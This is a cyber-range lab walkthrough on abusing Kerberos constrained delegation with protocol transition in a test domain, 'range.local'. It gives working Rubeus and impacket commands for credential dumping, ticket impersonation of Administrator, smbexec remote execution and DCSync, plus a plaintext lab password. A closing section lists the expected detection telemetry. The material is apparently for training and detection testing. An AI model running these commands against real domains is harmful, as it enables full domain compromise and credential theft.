# WT#005 — Constrained Delegation w/ Protocol Transition

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.23 (mbr02) / 192.168.77.12 (dc03) |
| **Domain** | range.local |
| **Starting Credential** | mbr02$ machine account (obtained via LSASS dump or Kerberoast) |
| **Tools Required** | Rubeus, impacket-secretsdump |
| **Certifications** | CRTE |
| **MITRE ATT&CK** | T1550.003 |
| **Difficulty** | Medium |

## Prerequisites
- mbr02$ machine account hash compromised (from WT#002 Kerberoast, LSASS dump, or relay)
- mbr02$ `msDS-AllowedToDelegateTo`: `cifs/dc03.range.local`, `ldap/dc03.range.local`
- mbr02$ `TrustedToAuthForDelegation = $true` (protocol transition enabled)

## Attack Steps

### Step 1 — Obtain mbr02$ machine account hash
```bash
# From kali, if you have code execution on mbr02, dump LSASS
# Or extract from SAM/SYSTEM hive
impacket-secretsdump RANGE/svc_sccm:'s3rv1c3_SCCM!'@192.168.77.23
```

### Step 2 — S4U2Self + S4U2Proxy for DA delegation
```bash
# Run Rubeus on mbr02 or from a Windows machine
# S4U2Self (protocol transition): request TGS to self as DA
# S4U2Proxy: present that TGS to request cifs/dc03 as DA

Rubeus.exe s4u /user:mbr02$ /aes256:<mbr02_aes256_hash> /impersonateuser:Administrator /domain:range.local /msdsspn:cifs/dc03.range.local /altservice:ldap /dc:dc03.range.local /ptt

# Or using impacket from kali with the machine hash
impacket-getST -spn cifs/dc03.range.local -impersonate Administrator -dc-ip 192.168.77.12 'RANGE/mbr02$:<ntlm_hash>' -aesKey <aes256_key>
```

### Step 3 — Access dc03 with delegated ticket
```bash
# Export the ticket
export KRB5CCNAME=/tmp/administrator.ccache

# Access CIFS on dc03 (file system)
impacket-smbexec -no-pass -k administrator@dc03.range.local

# Access LDAP on dc03 (DCSync)
impacket-secretsdump -no-pass -k administrator@dc03.range.local
```

## Post-Exploitation Chain
WT#005 → DA on range.local → DCSync dc03 → extract all hashes → cross-forest trust attack → cadre.local

## Telemetry Verification
- **Elastic Index:** `logs-system.security-*`, `logs-windows.sysmon_operational-*`
- **Expected Events:**
  - Event ID 4624: Logon with explicit credentials (S4U2Self)
  - Event ID 4672: Admin logon assigned special privileges
  - Event ID 5145: Network share access on dc03 via CIFS
  - Sysmon EID 1: Rubeus.exe process creation
- **Zeek:** `kerberos.log` showing S4U2Self/S4U2Proxy TGS requests with cifs/dc03.range.local and ldap/dc03.range.local
- **Arkime:** PCAP of Kerberos PA-FOR-USER S4U traffic

## Status
CONFIGURED
